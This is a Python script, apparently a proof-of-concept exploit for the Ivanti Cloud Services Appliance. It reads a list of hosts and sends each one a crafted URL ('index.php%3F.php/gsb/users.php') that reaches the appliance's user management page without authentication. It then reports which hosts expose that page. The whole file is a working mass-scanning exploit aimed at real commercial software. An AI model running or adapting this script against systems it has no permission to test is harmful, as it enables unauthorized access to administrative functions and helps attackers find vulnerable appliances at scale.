import requests
import sys

# ANSI color codes
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

def exploit(base_url):
    # URL to exploit the path traversal vulnerability
    target_url = f"http://{base_url}/client/index.php%3F.php/gsb/users.php"

    try:
        # Sending the GET request to exploit the vulnerability
        print(f"[*] Sending exploit request to {target_url}")
        response = requests.get(target_url, verify=False, timeout=10)

        # Check if the exploitation was successful
        if response.status_code == 200 and all(keyword in response.text for keyword in ["Ivanti Cloud Services Appliance", "User name", "Set Password"]):
            print(f"{GREEN}[+] {base_url} is vulnerable!{RESET}")
        else:
            print(f"{RED}[-] {base_url} is not vulnerable or inaccessible.{RESET}")

    except requests.exceptions.RequestException as e:
        print(f"{RED}[-] Error occurred with {base_url}: {e}{RESET}")

if __name__ == "__main__":
    if len(sys.argv) != 3 or sys.argv[1] != '-l':
        print("Usage: python3 exploit.py -l <list.txt>")
        print("Example: python3 exploit.py -l list.txt")
        sys.exit(1)

    # File containing list of IPs or URLs
    list_file = sys.argv[2]

    # Read the list of IPs/URLs
    try:
        with open(list_file, 'r') as file:
            urls = [line.strip() for line in file if line.strip()]

        # Test each IP/URL in the list
        for base_url in urls:
            exploit(base_url)

    except FileNotFoundError:
        print(f"{RED}Error: File '{list_file}' not found.{RESET}")
        sys.exit(1)
